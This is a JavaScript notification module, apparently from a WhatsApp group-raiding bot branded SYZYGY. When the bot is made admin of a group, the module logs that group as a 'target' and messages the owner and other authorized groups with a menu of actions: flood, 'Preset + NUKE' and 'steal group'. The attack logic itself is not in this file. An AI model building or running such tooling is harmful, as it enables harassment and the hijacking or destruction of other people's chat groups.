// services/notificationService.js
// [v28] Notificações para dono + grupos autorizados.

import { getSock, rt } from "../connection/socket.js"
import { ownerJidForSending, getAuthorizedGroups } from "../utils/permissions.js"
import { err, ok } from "../utils/terminalUI.js"
import { enviarPainelInicial } from "../menus/mainMenu.js"
import { safeSendMessage } from "./groupService.js"

export async function enviarNotifNovoGrupo(jid, info) {
    const { subject, groupJid, isAdmin } = info
    const body =
        `NOVO GRUPO DETECTADO\n` +
        `--------------------------------\n` +
        `O bot entrou em um grupo.\n` +
        `Grupo: ${subject}\n` +
        `ID: ${groupJid}\n` +
        `Admin: ${isAdmin ? "SIM" : "NAO"}\n` +
        `--------------------------------\n` +
        `SYZYGY`
    try { await safeSendMessage(jid, { text: body }) } catch {}
}

export async function enviarNotifAdminRecebido(ownerKey, groupJid, subject) {
    const sock = getSock()
    const oj = ownerJidForSending()
    if (!oj) return

    rt().grupoAlvo = rt().grupoAlvo || {}
    rt().grupoAlvo[ownerKey || "owner"] = { id: groupJid, subject }

    const body =
        `ADMIN RECEBIDO\n` +
        `--------------------------------\n` +
        `Agora sou admin em: ${subject}\n` +
        `ID: ${groupJid}\n` +
        `--------------------------------\n` +
        `ACOES RAPIDAS (responda o numero):\n` +
        `  A1 - Listar Grupos\n` +
        `  A2 - FLOOD\n` +
        `  A3 - Preset + NUKE\n` +
        `  A4 - Roubar Grupo\n` +
        `--------------------------------\n` +
        `Ou digite: menu\n` +
        `SYZYGY`

    // 1) Envia no PV do dono
    try { await safeSendMessage(oj, { text: body }) } catch {}

    // 2) [v28] Envia também nos grupos autorizados (exceto o próprio grupo onde ganhou ADM)
    try {
        const authGroups = getAuthorizedGroups()
        for (const gJid of authGroups) {
            if (gJid === groupJid) continue
            try {
                await safeSendMessage(gJid, { text: `🔔 ${body}` }, 0)
                await new Promise(r => setTimeout(r, 150))
            } catch {}
        }
        if (authGroups.length) console.log(ok(`[NOTIF] ADMIN recebido notificado em ${authGroups.length} grupos autorizados`))
    } catch {}
}

export async function notificarBotOnline() {
    const r = rt()
    if (r.notificacaoOnlineEnviada) return
    r.notificacaoOnlineEnviada = true
    const jid = ownerJidForSending()
    if (!jid) return
    try {
        await enviarPainelInicial(jid)
    } catch (e) {
        console.log(err(`Notif online: ${e.message}`))
    }
}
